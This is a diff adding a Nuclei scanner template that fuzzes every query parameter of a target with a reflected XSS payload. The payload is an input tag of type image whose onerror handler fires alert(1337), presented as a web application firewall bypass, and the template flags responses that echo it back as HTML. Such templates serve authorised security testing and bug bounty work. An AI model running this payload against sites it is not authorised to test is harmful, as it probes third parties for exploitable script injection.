@@ -1,0 +1,36 @@
+id: image-input-tag-xss-fuzzing
+
+info:
+  name: XSS Image bypass waf 
+  author: reewardius
+  severity: medium
+  reference: https://p4n7h3rx.medium.com/how-i-got-a-2000-bounty-with-rxss-e6f45f987793
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss:
+        - '\"><input type="image" src="1" onerror="alert(1337)">'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<input type="image" src="1" onerror="alert(1337)">'
+        
+      - type: word
+        part: header
+        words:
+          - text/html
